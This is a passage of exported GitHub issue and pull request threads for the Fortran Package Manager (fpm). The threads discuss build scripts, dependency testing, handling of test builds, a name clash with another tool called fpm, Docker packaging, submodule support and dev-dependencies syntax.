                    "date": "2020-06-12 21:09:38+00:00",
                    "text": "Cargo also has init and new. They have similar but complementary roles. I see value in having both."
                }
            ]
        },
        {
            "number": 95,
            "user": "everythingfunctional",
            "date": "2020-06-11 21:43:54+00:00",
            "title": "Fix ordering for library archive list",
            "text": "Found a bug in how the library archive paths are kept. Caused a link time error for complicated dependency trees.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 16:23:29+00:00",
                    "text": "I had a test that I thought tested this, but apparently the dependency tree wasn't deep/complicated enough. It took a real world, complicated usage to finally uncover it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-12 17:01:03+00:00",
                    "text": "Sounds good. I don't understand the fix, but it should go forward.\nWhat's the example that didn't work and that this PR fixes? It's helpful to know so that if the same or similar scenario causes an issue again, we'll know where to look. It's good to document these things at least in the PR thread. I agree with @certik regarding tests."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-12 17:01:16+00:00",
                    "text": "Merging."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 18:29:53+00:00",
                    "text": "I started a simple executable project with matterff and a few other of its dependencies as dependencies, and it barfed at the link command. Unfortunately it was in a work repo, so I can't provide a link, but I should be able to relatively easily put together a separate example repo if needed."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-12 18:32:12+00:00",
                    "text": "The problem was that it was keeping the first instance of duplicate entries in the list, but it needed to keep the last one. The fix is to just reverse the list before removing the duplicates and then reverse it back once that's done."
                }
            ]
        },
        {
            "number": 94,
            "user": "certik",
            "date": "2020-06-08 16:48:21+00:00",
            "title": "Implement a build script",
            "text": "I would do exactly what Cargo does: https://doc.rust-lang.org/cargo/reference/build-scripts.html\nOnly I would allow the build script to be any of: any binary, cmake, make, Bash script.\nOtherwise the following I would do exactly the same:\n\n\nInputs: environment variables\n\n\nOutputs: the build script prints to stdout with lines starting with fpm:, everything else is ignored. At the beginning, I would support the following, and we can add more later:\n\nfpm:fc-link-lib=[KIND=]NAME --- Adds a library to link (doc)\nfpm:fc-flags=FLAGS --- Passes certain flags to the compiler (doc).\n\nThat should be enough to get us started. One of the environment variables passed to the build script is which Fortran compiler is being used, so the build script would know what compiler parameters to pass back (for example ifort in general might require different flags than gfortran). In the same way, the flags might depend on the platform (macOS vs Linux vs Windows), so one of the input variables can be what platform we run on.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-11-22 05:04:16+00:00",
                    "text": "I was taking a look at this after some related comments in #118 prompted my interest.\nIn Rust a crate called cc is used to automate the process of building C dependencies. The crate is organized around two structs,  Build - used to specify project and compile options,  Tool - used to represent the invocation of the C compiler:\npub struct Build {\n    include_directories: Vec<PathBuf>,\n    definitions: Vec<(String, Option<String>)>,\n    objects: Vec<PathBuf>,\n    flags: Vec<String>,\n    flags_supported: Vec<String>,\n    known_flag_support_status: Arc<Mutex<HashMap<String, bool>>>,\n    ar_flags: Vec<String>,\n    no_default_flags: bool,\n    files: Vec<PathBuf>,\n    cpp: bool,\n    cpp_link_stdlib: Option<Option<String>>,\n    cpp_set_stdlib: Option<String>,\n    cuda: bool,\n    target: Option<String>,\n    host: Option<String>,\n    out_dir: Option<PathBuf>,\n    opt_level: Option<String>,\n    debug: Option<bool>,\n    force_frame_pointer: Option<bool>,\n    env: Vec<(OsString, OsString)>,\n    compiler: Option<PathBuf>,\n    archiver: Option<PathBuf>,\n    cargo_metadata: bool,\n    pic: Option<bool>,\n    use_plt: Option<bool>,\n    static_crt: Option<bool>,\n    shared_flag: Option<bool>,\n    static_flag: Option<bool>,\n    warnings_into_errors: bool,\n    warnings: Option<bool>,\n    extra_warnings: Option<bool>,\n    env_cache: Arc<Mutex<HashMap<String, Option<String>>>>,\n    apple_sdk_root_cache: Arc<Mutex<HashMap<String, OsString>>>,\npub struct Tool {\n    path: PathBuf,\n    cc_wrapper_path: Option<PathBuf>,\n    cc_wrapper_args: Vec<OsString>,\n    args: Vec<OsString>,\n    env: Vec<(OsString, OsString)>,\n    family: ToolFamily,\n    cuda: bool,\n    removed_args: Vec<OsString>,\n}\nMost of the fields are self-explanatory. A few ideas that came to my mind upon looking into the Rust code:\n\nFortran has the intrinsic subroutine CALL GET_ENVIRONMENT_VARIABLE(NAME[, VALUE, LENGTH, STATUS, TRIM_NAME) which makes it easy to recover the environment variables.\nFor the same family of compilers, the compile flags for Fortran and C will be the same, meaning that the derived type representing the compiler invocation can be re-used for compiling both Fortran and C source files. (The Rust crate is not limited to C code, it can accept any source code that can be passed to a C or C++ compiler. As such, assembly files with extensions .s (gcc/clang) and .asm (MSVC) can also be compiled.)\nThe cc crate even supports a parallel build feature for C and Rust sources by setting up a job server. Within Fortran we could do something similar using co-arrays or OMP tasks (once dependencies like these are allowed). The feature is enabled conditionally, using the following TOML option:\n\n[build-dependencies]\ncc = { version = \"1.0\", features = [\"parallel\"] }"
                }
            ]
        },
        {
            "number": 93,
            "user": "epagone",
            "date": "2020-06-07 12:22:50+00:00",
            "title": "Run dependencies tests",
            "text": "Use case: I'd like to build my program or library that depends on FGSL with fpm. I know how to specify such dependency (in theory, at least) and let's assume that there are no issues in fetching, compiling and linking.\nThe issue I'm raising here is: what if I want to make sure that the fetched and compiled dependency passes its tests on my machine before proceeding with linking and building my own program or library? How can I do that with fpm?\nI believe it's a non-trivial problem considering that each external dependency does not conform to fpm specs. Off the top of my head: maybe an additional key in the TOML file can be specified by the user that specifies how to test the dependency (e.g. make test)? However, I think that it is a sub-optimal solution because requires the user to gain this information for each dependency but it would be hard to have a general reliable method otherwise. Please correct me if I'm off-track.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-06-07 19:36:31+00:00",
                    "text": "@epagone good question. Here is how I think we are imagining this will work:\n\nyour program depends on FGSL.\nFGSL will be an fpm package. As such, when you execute fpm test in the FGSL repository, it will test it. (Currently FGSL is not an fpm package. We envision that eventually people would like to make all such libraries an fpm package, but until then, somebody can create simple repository that will be the fpm package for it, and it would fetch the FGSL sources and build it correctly with fpm, and it would ensure that fpm test works.)\nIn your program, you would just depend on the FGSL as an fpm package.\n\nTo run tests for FGSL, there are two options, you either checkout the FGSL repository and execute fpm test there. Or we can add an option to fpm test, such as fpm test -p FGSL that would execute the tests for FGSL.\nI just checked how Cargo does it. And while Cargo has the -p option for cargo test, it only works with local packages in a workspace (one can have multiple packages in a git repository), but it doesn't seem to work for dependencies that are not in the current repository.\nWe can discuss this more."
                },
                {
                    "user": "epagone",
                    "date": "2020-06-08 00:55:40+00:00",
                    "text": "Thanks for the explanation @certik, I understand now the logic better. However, I went back to re-read the packaging guide and I think the requirement that the dependency has to be already an fpm package is not stated:\n\nInevitably you'll want to be able to include other libraries in your project. fpm makes this incredibly simple, by taking care of fetching and compiling your dependencies for you. You just tell it what your dependencies are, and where to find them.\n\nProbably the assumption that the dependency has been already packaged with fpm is implied. Thinking about it, I guess it should not be a big deal to re-package existing libraries in fpm: it's a matter of swapping files in the right directories and writing the fpm.toml file (if I'm not missing anything major)."
                },
                {
                    "user": "certik",
                    "date": "2020-06-08 02:26:54+00:00",
                    "text": "@epagone yes, that's the most natural approach."
                }
            ]
        },
        {
            "number": 92,
            "user": "certik",
            "date": "2020-06-07 04:32:52+00:00",
            "title": "Only compile tests for fpm test command",
            "text": "cargo build does not build tests. You have to do cargo build --tests to also build tests.\ncargo test build tests (if needed) and runs them.\nI suggest we follow the same approach.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 19:10:47+00:00",
                    "text": "How would we implement this behaviour? Would we remove the tests when building the model from the manifest or should we just filter them out from the targets?"
                },
                {
                    "user": "certik",
                    "date": "2021-09-05 20:50:21+00:00",
                    "text": "Model should have everything. Then in fpm build you only build the main program but not tests. That can be achieved with multiple approaches, either removing the tests from the model, or by skipping them when building."
                },
                {
                    "user": "LKedward",
                    "date": "2021-09-13 09:52:32+00:00",
                    "text": "How would we implement this behaviour? Would we remove the tests when building the model from the manifest or should we just filter them out from the targets?\n\nI agree and would suggest keeping everything in the model and simply filtering them out with additional arguments when building the target list in build_target_list"
                }
            ]
        },
        {
            "number": 90,
            "user": "certik",
            "date": "2020-06-04 20:55:38+00:00",
            "title": "The name fpm is used by another package manager",
            "text": "It was just pointed out to me that fpm is used by another project: https://github.com/jordansissel/fpm. Unfortunately it is in a similar field (also a package manager).\nHere are some options going forward (I'll update this list if there are more):\n\nRename our fpm\nKeep the name fpm and ensure that people do not mistake the two projects (what's the best way?)\n\nAs to myself, I really like the name fpm to mean a Fortran Package Manager. So I vote for 2., if there is a way to do it.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-04 21:13:50+00:00",
                    "text": "I vote for 2 as well. I think the two are sufficiently different, but knowing it's out there we can be conscious to avoid confusion as much as possible.\nOn a side note, should we use that tool to create our Linux packages?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-04 21:24:35+00:00",
                    "text": "This is unfortunate, though not surprising.\nAs the originator of the name, I'm sorry. I should've done better research. :(\nMy preference is also for 2, because I like the name. However I see issues ahead of us, and it will only be more difficult to rename later. Issues are:\n\nConfusion\nConflict (both CLI tools are called fpm)\nBad look on us as the community, as we are a younger project\n\n\nOn a side note, should we use that tool to create our Linux packages?\n\nThough it sounds like a good idea, now we're really screwed: \"So fpm will package fpm for Linux. Wait, which fpm is this? Is it this fpm or the other fpm?\". I'm confused already. :)\n\nSo I vote for 2., if there is a way to do it.\n\nLet's discuss how we could do it. This would probably mean putting a large disclaimer at the top of our README, saying \"This fpm is not the other fpm\", or similar. What else?\n@jordansissel Do you have any advice for us?"
                },
                {
                    "user": "jordansissel",
                    "date": "2020-06-05 00:59:34+00:00",
                    "text": "I ran into this myself shorty after releasing (my) fpm! I learned there\u2019s a\ntool PHP-FPM That many folks call FPM.\n\nNaming is hard. It\u2019s hard to know if conflicting names will cause\ndifficulties.\n\nI\u2019ve run into weirdness myself with things on Debian like \u201cdocker\u201d package\nnot being the container runtime tool.\n\nI think my advice is this: if you feel fpm is the right name for your tool,\nthen please keep the name. Computers and humans will likely figure this out\non their own with their own workarounds that aren\u2019t too harmful. Examples\nabound, like you can\u2019t really search for \u201cgo\u201d so while the language is Go\nyou gotta search golang. It\u2019s a weird workaround but it works most of the\ntime.\n\nIs this a bad look? I don\u2019t think so!\n\n+1 for a clarification at the top of the README. I\u2019d be happy to include a\nsimilar clarification in my fpm readme and docs. Something short and direct\nthat describes the project (FORTRAN for this one) and offers disambiguation\nlinks to help any wayward travelers.\n\nI agree with concern about command line name conflicts, but it\u2019s unclear\nwhat negative impact this will have. Again here we have examples like\ndownstream OS calling \u201cpip\u201d executable \u201cpython3-pip\u201d or similar naming\nsolutions. That said, it\u2019s probably fine to keep the cli name the same?\n\nAs for search/discovery, \u201cfpm\u201d plus any context should help search engines\nfind the right place for users.\n\nThoughts? Having the project and cli name be the same has low risk in my\nopinion.\n\u2026\nOn Thu, Jun 4, 2020 at 2:24 PM Milan Curcic ***@***.***> wrote:\n This is unfortunate, though not surprising.\n\n As the originator of the name\n <fortran-lang/stdlib#44 (comment)>,\n I'm sorry. I should've done better research. :(\n\n My preference is also for 2, because I like the name. However I see issues\n ahead of us, and it will only be more difficult to rename later. Issues are:\n\n    - Confusion\n    - Conflict (both CLI tools are called fpm)\n    - Bad look on us as the community, as we are a younger project\n\n On a side note, should we use that tool to create our Linux packages?\n\n Though it sounds like a good idea, now we're really screwed: \"So fpm will\n package fpm for Linux. Wait, which fpm is this? Is it this fpm or the other\n fpm?\". I'm confused already. :)\n\n So I vote for 2., if there is a way to do it.\n\n Let's discuss how we could do it. This would probably mean putting a large\n disclaimer at the top of our README, saying \"This fpm is not the other\n fpm\", or similar. What else?\n\n @jordansissel <https://github.com/jordansissel> Do you have any advice\n for us?\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#90 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AABAF2WIFDF5BRL244MHV4LRVAGKDANCNFSM4NS7GCRA>\n ."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-05 02:54:11+00:00",
                    "text": "Jordan, thanks a lot. With your encouragement I now feel more comfortable keeping the name, and making it clear in the README to avoid confusion.\nSo if @certik and @everythingfunctional agree, we'll add the clarification and link to the top of the README."
                },
                {
                    "user": "certik",
                    "date": "2020-06-05 04:11:25+00:00",
                    "text": "@jordansissel thank you for your nice comment. Since you are ok with us keeping the name, I am too. @milancurcic yes, let's send a PR with a clarification at the top of our README and docs. That should make it clear to users.\nI agree with Jordan that there are ways around it. For example Debian has the alternatives system, so users will be able to choose what they want to run as fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-05 04:43:29+00:00",
                    "text": "I am in agreement. Good call just reaching out and asking, and thank you @jordansissel for your understanding and encouragement."
                },
                {
                    "user": "certik",
                    "date": "2020-06-05 21:49:37+00:00",
                    "text": "Here is an example how Spack disambiguates the name:\nhttps://spack.readthedocs.io/en/latest/\nThey write:\n\nThese are docs for the Spack package manager. For sphere packing, see pyspack."
                },
                {
                    "user": "nshaffer",
                    "date": "2020-06-13 23:23:01+00:00",
                    "text": "The fpm help text gave me an idea for an alternate name.\nwwf - working with Fortran\nIt seems like the naming crises has passed, but I'm just too tickled by the idea of scientists and engineers co-opting \"WWF\" to mean their package manager."
                }
            ]
        },
        {
            "number": 89,
            "user": "everythingfunctional",
            "date": "2020-06-02 15:12:27+00:00",
            "title": "Add ability to specify which test or program to run and their args",
            "text": "This adds some command line arguments to allow specifying which executable or test you would like to run, and any command line arguments you would like to pass on.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-04 20:15:45+00:00",
                    "text": "At this stage I (we) haven't really talked about whether executables should be in their own directory. So that is kind of a current edge case bug.\nRight now it just assumes that for a given executable, everything else in that directory is a module meant to be included with it. So while trying to compile one executable it saw the source for the other, assumed it was a module, and failed when compiling it didn't result in the appropriate mod file (or at least I'm guessing that's what happened).\nI'd suggest creating an issue so we can discuss and decide whether this should be documented as a limitation/requirement or marked as a bug to fix later."
                },
                {
                    "user": "certik",
                    "date": "2020-06-04 20:36:36+00:00",
                    "text": "Right. We should also consult how Rust does it.\n+1 to merge this PR."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-04 20:40:13+00:00",
                    "text": "I now see approval from @certik, so I agree to merge this, and we can add some basic instructions to the README in a separate PR."
                },
                {
                    "user": "certik",
                    "date": "2020-06-04 20:44:53+00:00",
                    "text": "See #83 for improving the tests in general. We have to add a lot more tests, that would serve as the \"spec\" of how fpm is expected to work."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-04 21:08:43+00:00",
                    "text": "I'll go ahead and add stuff to the README for this PR. No sense leaving it half done.\nAs for the testing, I think there's just one last thing I'd like to take a crack. I want to get support for using a build script or makefile. That shouldn't take much time to implement. Then yes, we should focus our efforts on writing as many tests (both happy path and error conditions) as we can think of.\nUp to this point, this has been a prototype. I think we've been incredibly successful with it, and it's functionality is pretty much right where we want. So now we just put some tests around it to make sure nothing breaks while we pretty up the insides."
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-05 07:55:12+00:00",
                    "text": "Right now it just assumes that for a given executable, everything else in that directory is a module meant to be included with it. So while trying to compile one executable it saw the source for the other, assumed it was a module, and failed when compiling it didn't result in the appropriate mod file (or at least I'm guessing that's what happened).\nI'd suggest creating an issue so we can discuss and decide whether this should be documented as a limitation/requirement or marked as a bug to fix later.\n\nThanks for the explanation, this behaviour makes more sense to me now; I don't think it's a bug but it is definitely something that needs to be documented in PACKAGING.md."
                },
                {
                    "user": "certik",
                    "date": "2020-06-07 04:26:03+00:00",
                    "text": "So cargo build does not build tests. You have to do cargo build --tests to also build tests.\ncargo test build tests (if needed) and runs them.\nI suggest we follow the same approach."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-07 04:30:09+00:00",
                    "text": "Ok. That will require some (minor) refactoring to get working properly. Open an issue and I can fix it in another PR."
                },
                {
                    "user": "certik",
                    "date": "2020-06-07 04:33:08+00:00",
                    "text": "Sure: #92."
                }
            ]
        },
        {
            "number": 87,
            "user": "everythingfunctional",
            "date": "2020-05-31 00:18:15+00:00",
            "title": "Docker Image With fpm",
            "text": "Now that fpm is in a usable state, I think we should try and create a docker image with the latest version installed, so people can use fpm in their CI.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-31 02:59:46+00:00",
                    "text": "Yes. Even better we should distribute fpm as a single binary for each platform."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-01 02:11:14+00:00",
                    "text": "I think we should focus more on package manager distributions than just an executable. At a minimum we should support apt, yum, pacman, and homebrew. Probably also some others. Manually installed things don't get updated very often, if at all."
                },
                {
                    "user": "certik",
                    "date": "2020-06-01 02:16:37+00:00",
                    "text": "Yes, we need all of those also.\n\u2026\nOn Sun, May 31, 2020, at 8:11 PM, Brad Richardson wrote:\n\n\n I think we should focus more on package manager distributions than just\n an executable. At a minimum we should support `apt`, `yum`, `pacman`,\n and `homebrew`. Probably also some others. Manually installed things\n don't get updated very often, if at all.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#87 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWAXGOLNFFNM2HC23I3RUME43ANCNFSM4NO5JRWQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-01 18:18:03+00:00",
                    "text": "Let's not forget fpm update. This is something I'd expect as a user. fpm should be able to update itself.\nI'm not a target audience for Docker image but I see its value.\nLinux system package managers like apt and dnf I use occasionally, but I can't take them seriously because so many packages are out of date, so they're mostly good for mature (stable) packages. I agree one should be able to get fpm using those. Then also consider Homebrew, Linuxbrew, and Snapcraft."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-02 13:25:26+00:00",
                    "text": "I quickly slapped together a docker image here. I scheduled the CI to update weekly as well.\nAt some point this will deserve some effort to trim down the size of the resulting image. Right now I based it on Ubuntu and built fpm in the image. It should be possible to use a more lightweight starting point (like Alpine) and just copy in the fpm executable. Then we should create a more official one and publish it on docker hub."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-02 13:51:37+00:00",
                    "text": "Great! I think it's a good start. I suggest adding the Dockerfile (and associated instructions in the README.md) to the fpm repo."
                }
            ]
        },
        {
            "number": 86,
            "user": "LKedward",
            "date": "2020-05-30 16:12:03+00:00",
            "title": "Support Fortran submodules",
            "text": "Except for small/simple projects, I almost always adopt Fortran submodules now to structure new projects. This is primarily for the parallel and incremental builds that they allow.\nI realise this may be low down on the list of project priorities currently, but I think it should only require an update to the dependency tracking whereby submodules depend on their parent modules as if they use them.\nMuch further down the line, I assume fpm will aim for some kind of parallel build support?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-30 16:14:52+00:00",
                    "text": "Thanks. Yes, fpm must work with submodules and yes, we must be able to build in parallel."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 19:55:20+00:00",
                    "text": "fpm does support parallel builds right now. All modules are compiled in parallel (to the extent they can be of course, given dependencies on the .mod files). Supporting submodules won't be too difficult, but I haven't found a particularly compelling use case."
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-30 20:01:22+00:00",
                    "text": "fpm does support parallel builds right now. All modules are compiled in parallel\n\nThis is awesome! I didn't realise. Does it use all available threads by default?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 23:04:41+00:00",
                    "text": "Yep"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 14:17:30+00:00",
                    "text": "I've gotten a request from a paying customer to add support for submodules ASAP. The question I have for the rest of the group has to do with the naming convention restrictions we currently have in place for modules.\nThe dependency detection and build system has to get a lot more rigorous and complex, so I'm thinking of just removing the name-spacing and file name matching requirement we had for modules, since it doesn't quite apply properly to submodules. And while I like it as a convention, it was done partly to avoid doing the harder work of properly looking in the source files.\nDo you guys have any thoughts? It won't add any backwards incompatibilities, and it won't add any complexities from a user perspective."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 14:21:48+00:00",
                    "text": "The dependency detection and build system has to get a lot more rigorous and complex, so I'm thinking of just removing the name-spacing and file name matching requirement we had for modules, since it doesn't quite apply properly to submodules. And while I like it as a convention, it was done partly to avoid doing the harder work of properly looking in the source files.\n\nI have no objection to removing these naming requirements - I actually found it very restrictive when trying out fpm with existing packages which have their own various naming conventions.\nI'm excited for submodule support! \ud83d\ude80"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-08-17 15:00:21+00:00",
                    "text": "This sentence confuses me:\n\nI'm thinking of just removing the name-spacing and file name matching requirement we had for modules, since it doesn't quite apply properly to submodules.\n\nDo you mean keep the existing requirement for modules, but don't require it for submodules? I think so, because later you wrote \"It won't add any backwards incompatibilities\".\nI don't understand well how submodules are managed by compilers. If there's no possibility of name clash between submodules from different packages, then I don't see the need to enforce the same convention we have for modules. So, this sounds good to me, but let's make sure that that's the case."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 15:16:32+00:00",
                    "text": "I mean remove the existing requirement for modules. Removing that requirement is backwards compatible.\nSubmodules are a bit convoluted.\nCompiling a module produces a .mod and .smod with the name of the module. Compiling a submodule depends on the .mod and .smod of its parent module, and the .smod of any parent submodules, and produces a .smod file named parent_mod@parent_smod1@parent_smod2@...@submod.smod. Then all of the object files from the whole tree must be linked into the library or executable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 15:43:46+00:00",
                    "text": "If there's no possibility of name clash between submodules from different packages, then I don't see the need to enforce the same convention we have for modules.\n\nI hadn't realised this convention was for avoiding name clashes but I guess that makes sense - how would name clashes be avoided without this requirement @everythingfunctional ?\n\nSubmodules are a bit convoluted.\n\nI remember reading somewhere that submodule file naming conventions vary between compiler vendors - can these dependencies not be tracked without relying on .mod and .smod files?\nWithin my makefiles I never reference *mod files and simply rely on the corresponding object file for updating dependencies; in this way submodule dependencies can be treated like a normal use dependency where the submodule 'uses' its parent module."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 17:10:34+00:00",
                    "text": "I'd still recommend people follow that naming convention, it just won't be a hard requirement. So you can still have a module named utilities_stats in a file src/utilities/stats.f90 per the current requirement and it will still work just fine. With the change, the module could just be named stats, but if any other package has a module named stats, they'll conflict of course. The possibility of conflict already exists, and I think always will unless we make a breaking change and require all modules in a library be prefixed with the name of the library.\nI don't recall exactly where I read that naming convention. It may have just been the gfortran documentation, in which case this may be a bit trickier when we try and support multiple compilers, but hopefully not a big deal.\nWhile you can write your makefiles without mentioning the .mod files, it's not strictly correct. Compiling a source file doesn't actually depend on the object files, just the .mod files. And it sidesteps a potential optimization I wish the compilers would actually implement; don't update the .mod file if none of the interfaces changed. That would actually take care of the \"recompilation cascades\" that most people give as the motivation for using submodules."
                },
                {
                    "user": "certik",
                    "date": "2020-08-17 17:42:38+00:00",
                    "text": "I think I am against removing the restriction by default. I very strongly believe the default should be setup in a way to guarantee that there cannot be any name collisions.\nThis restriction is there to prevent name collisions. What we can do is remove the restrictions if the user requests that in fpm.toml --- with the understanding that fpm cannot guarantee there won't be name collisions with user code any more; this option would be used to get existing packages working quickly, but they will not be \"conforming\", and thus there can be collisions."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 17:59:08+00:00",
                    "text": "The restrictions currently in place do not actually guarantee there cannot be any name collisions. If you put a module named utils in the root src folder, you're almost guaranteed to have a name collision with some other package and there isn't anything in place preventing that at the moment.\nThe restriction is really only preventing accidental name collisions within a library, and so far the errors have caused more confusion than they have helped anything.\nI can add a check for it back in once this is implemented, but at that point it's just enforcing a convention (albeit a good one), more than any technical requirement, and still not actually guaranteeing no name collisions between packages."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 18:18:39+00:00",
                    "text": "While you can write your makefiles without mentioning the .mod files, it's not strictly correct. Compiling a source file doesn't actually depend on the object files, just the .mod files.\n\nGood point, but I disagree with your assertion of incorrectness; depending on module object files will not result in an incorrect dependency between source files, rather it (theoretically) results in redundant recompilation as you point out. Therefore object file dependencies are correct for modules, but not optimal.\nI am genuinely intrigued as to why your proposed optimisation is not implemented anywhere, it seems like a simple fix to a big problem!\n\nThat would actually take care of the \"recompilation cascades\" that most people give as the motivation for using submodules.\n\nMy own motivation for submodules is mainly to flatten the dependency tree to just two layers so that each layer can be compiled completely in parallel. Being able to compile in parallel quickly outweighs any redundancy in my dependencie.\n\nI think I am against removing the restriction by default. I very strongly believe the default should be setup in a way to guarantee that there cannot be any name collisions.\n\nMy preference would be for an alternative solution to avoiding name collisions, perhaps we should discuss in a dedicated thread?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-08-17 18:27:58+00:00",
                    "text": "The restrictions currently in place do not actually guarantee there cannot be any name collisions.\n\nThat's true but this is not so much about the current guarantees, but about the design we're aiming for.\nDo we want to prevent name clashes? (I think it's unanimous yes)\nIf yes, then what is the optimal solution to do it? Prefixing with the package name is the best I can think of.\nThe only exception should be single-module libraries, which could have a module with the same name as the package.\nI think this would be good to discuss on our call on Thursday."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 18:48:11+00:00",
                    "text": "My preference would be for an alternative solution to avoiding name collisions, perhaps we should discuss in a dedicated thread?\n\nYes, I'll start a new issue."
                }
            ]
        },
        {
            "number": 85,
            "user": "everythingfunctional",
            "date": "2020-05-30 03:03:17+00:00",
            "title": "Implement test/executable specific dependencies",
            "text": "At this point it's kind of a terrible, ugly, hacked together prototype, but it works. And allows for \"semi\"-circular dependencies. If one of your test or executable dependencies depends on your library, it will still work.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 03:08:20+00:00",
                    "text": "My use case for this is that vegetables depends on both iso_varying_string and strff, but I want to be able to use vegetables to test them. This way that will work.\nI still need to try to migrate these to using fpm to be sure that it will work, but I'll try that over the next day or two. The test I added suggests it will."
                },
                {
                    "user": "certik",
                    "date": "2020-05-30 04:08:40+00:00",
                    "text": "Yes, we need this feature. However, let's follow the Cargo's syntax? Or do you have reasons why that's not a good idea in this case?\nhttps://doc.rust-lang.org/cargo/reference/specifying-dependencies.html#development-dependencies\nIt has [dependencies] for just building the package, and additional [dev-dependencies] for building tests / benchmarks etc.\nCurrently you have:\n[[test]]\n  name = \"test\"\n  source-dir = \"tests\"\n  main = \"main.f90\"\n  [test.dependencies]\n    circular_test = { path = \"../circular_test\" }\nLet's instead do:\n[dev-dependencies]\n    circular_test = { path = \"../circular_test\" }\n\n[[test]]\n  name = \"test\"\n  source-dir = \"tests\"\n  main = \"main.f90\"\nAnd finally fpm should be clever enough to figure out the tests from the layout only (eventually), so it would become just:\n[dev-dependencies]\n    circular_test = { path = \"../circular_test\" }\nIn Cargo you can specify also dependencies for a particular target only. But it seems this dev-dependencies would cover 90% of use cases, including yours (I think)."
                },
                {
                    "user": "certik",
                    "date": "2020-05-30 04:09:43+00:00",
                    "text": "My other comment is that instead of adding tests in the root directory as examples, let's move them in the tests directory?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-30 19:41:26+00:00",
                    "text": "I'm not opposed to also having [dev-dependencies], but my question would be, are those used for the executables too? Or would we want to have [test-dependencies] and [exe-dependencies]?\nI can move the tests into the tests directory. That's no problem."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-31 00:16:34+00:00",
                    "text": "I was able to try this out converting a few of my libraries to using fpm, and it works great. This will make it possible for me to convert (almost) all of my packages to fpm."
                },
                {
                    "user": "certik",
                    "date": "2020-05-31 02:49:41+00:00",
                    "text": "I am not sure about the executables --- I would expect that dev-dependecies only work for tests, benchmarks etc.\nIn your use case, you have to have special dependencies for executables?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-31 23:20:53+00:00",
                    "text": "I don't personally have a project with special dependencies for an executable, but I could envision one. Somebody develops and tool, and there's a library that goes along with it, but the executable has dependencies that user's of the library don't necessarily need. The use case is probably rare enough, and covered by the executable/test specific dependencies I've already implemented that having dev-dependencies only for tests is probably fine. I'll get that implemented."
                },
                {
                    "user": "certik",
                    "date": "2020-05-31 23:35:10+00:00",
                    "text": "Yes, I think that's precisely the approach that Cargo took also. For this rare case, you just specify the dependency for the executable that needs it. Otherwise the dependencies and dev-dependencies cover over 90% of use cases.\n\nThanks for all the work you are doing on this.\n\u2026\nOn Sun, May 31, 2020, at 5:21 PM, Brad Richardson wrote:\n\n\n I don't personally have a project with special dependencies for an\n executable, but I could envision one. Somebody develops and tool, and\n there's a library that goes along with it, but the executable has\n dependencies that user's of the library don't necessarily need. The use\n case is probably rare enough, and covered by the executable/test\n specific dependencies I've already implemented that having\n `dev-dependencies` only for tests is probably fine. I'll get that\n implemented.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#85 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWCG44ZNP5I7MSX2U3LRULQ6BANCNFSM4NOQBL6A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-01 16:32:06+00:00",
                    "text": "Sorry, I don't have time to review this but please go forward with it and I will play with it at a later time."
                }
            ]
        },
        {
            "number": 84,
            "user": "certik",
            "date": "2020-05-29 18:14:25+00:00",
            "title": "Optional dependencies",
